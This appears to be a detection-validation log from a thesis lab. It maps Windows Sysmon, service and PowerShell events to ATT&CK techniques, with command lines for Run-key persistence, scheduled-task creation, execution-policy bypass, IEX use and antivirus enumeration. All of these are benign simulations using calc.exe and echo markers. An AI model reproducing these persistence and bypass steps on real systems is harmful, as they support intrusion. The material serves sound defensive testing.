2026-06-24T12:51:38.812Z	P4	TEC-004	T1547.001	Registry Run Key modification by reg.exe - basic profile v2	CU004_Source_TEC004_RunKeys_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU004_Source_TEC004_RunKeys_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.589Z	P4	TEC-005	T1569.002	Windows service creation detected - basic profile v2	CU005_Source_TEC005_ServiceCreation_7045	LT29.ait.us.es	System	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	7045	Windows System Event 7045	05_LOGS\Validas\Prueba_24_06_2026\CU005_Source_TEC005_ServiceCreation_7045-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.989Z	P2	TEC-001	T1059.001		Forensic_EVENT_PowerShell4104_Strong_By_Technique	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_PowerShell4104_Strong_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.900Z	P2	TEC-006	T1518.001		Forensic_EVENT_PowerShell4104_Strong_By_Technique	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_PowerShell4104_Strong_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:16.265Z	P2	TEC-006	T1518.001		Forensic_EVENT_PowerShell4104_Strong_By_Technique	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_PowerShell4104_Strong_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:37.594Z	P2	TEC-001	T1059.001		Forensic_EVENT_PowerShell4104_Strong_By_Technique	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	function Test-Tec009Evidence { param( [AllowEmptyString()][string]$Command = "", [AllowEmptyString()][string]$ScriptPath = "", [AllowEmptyString()][string]$ReceiverUrl = "", [AllowEmptyString()][string]$HttpStatus = "", [AllowEmptyString()][string]$UploadSucceeded = "", [AllowEmptyString()][string]$ZipFile = "", [AllowEmptyString()][string]$CopyFile = "", [AllowEmptyString()][string]$LocalSHA256 = "", [AllowEmptyString()][string]$SummaryFile = "", $SummaryObject = $null, $PowerShell4104 = $null ) $checks = @() $checks += New-EvidenceCheckRow -CheckName "powershell.exe -File invocation" -Status $(if ($Command -match '(?i)powershell\.exe\s+-NoProfile\s+-ExecutionPolicy\s+Bypass\s+-File') { "OK" } else { "FAIL" }) -Expected "powershell.exe -NoProfile -ExecutionPolicy Bypass -File" -Found $Command -Evidence $Command -Comment "TEC-009 must run in an explicit PowerShell child process." $checks...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_PowerShell4104_Strong_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P2	TEC-003	T1053.005		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.696Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.715Z	P2	TEC-005	T1569.002		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.576Z	P2	TEC-003	T1053.005		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.696Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.715Z	P2	TEC-005	T1569.002		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.788Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.806Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:18.149Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /query /tn "TFM-TEC-003" /v /fo list	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P2	TEC-003	T1053.005		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P2	TEC-003	T1053.005		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.343Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.377Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
